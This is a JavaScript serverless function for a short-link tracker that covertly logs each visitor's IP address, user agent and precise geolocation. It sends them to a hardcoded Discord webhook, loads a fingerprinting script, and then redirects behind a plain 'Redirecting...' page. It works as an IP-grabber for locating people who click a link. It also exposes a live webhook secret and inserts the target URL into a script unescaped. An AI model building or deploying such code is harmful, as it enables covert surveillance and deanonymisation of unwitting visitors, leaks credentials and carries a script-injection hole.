// functions/api/track/[shortCode].js
import { db } from '../../../store';

export async function onRequestGet(context) {
  try {
    const { request, params } = context;
    const shortCode = params.shortCode;
    console.log(`【短碼紀錄】收到 GET 請求，shortCode = "${shortCode}"`);

    const targetUrl = db.urls[shortCode];
    if (!targetUrl) {
      console.error(`【短碼紀錄】無效連結，找不到 db.urls["${shortCode}"]`);
      return new Response('無效連結', { status: 404 });
    }

    const ip = request.headers.get('CF-Connecting-IP');
    const ua = request.headers.get('User-Agent');
    const geo = {
      city: request.cf?.city,
      region: request.cf?.region,
      country: request.cf?.country,
      latitude: request.cf?.latitude,
      longitude: request.cf?.longitude,
      timezone: request.cf?.timezone,
      asn: request.cf?.asn,
      org: request.cf?.asOrganization
    };

    console.log(`【短碼紀錄】短碼 "${shortCode}" 被訪問，IP="${ip}", UA="${ua}"`);

    db.logs[shortCode].push({
      timestamp: new Date().toISOString(),
      ip,
      ua,
      geo
    });

    // 發送 Discord webhook 通知
    const webhookUrl = 'https://discord.com/api/webhooks/1353930302141239347/1szsFFb63TCOnSse9laS87xVhHENhe_EyaHppyyJjxd6rFq_a_ddSuG9uF7na0eh5sEL';
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: `🕵️ 連結被點擊！\n短碼: ${shortCode}\n💻IP: ${ip}\nUser-Agent: ${ua}\n📬地點: ${geo.city}, ${geo.region}, ${geo.country}`
      })
    }).catch(() => {});

    console.log(`【短碼紀錄】將在 1.5 秒後轉跳至 "${targetUrl}"`);

    return new Response(`
      <html>
        <head><title>Redirecting...</title></head>
        <body>
          <script src="/track-fp.js"></script>
          <script>
            setTimeout(() => {
              window.location.href = "${targetUrl}";
            }, 1500);
          </script>
        </body>
      </html>
    `, {
      headers: { 'Content-Type': 'text/html' }
    });
  } catch (error) {
    console.error('【短碼紀錄】發生未預期錯誤：', error);
    return new Response('伺服器內部錯誤', { status: 500 });
  }
}
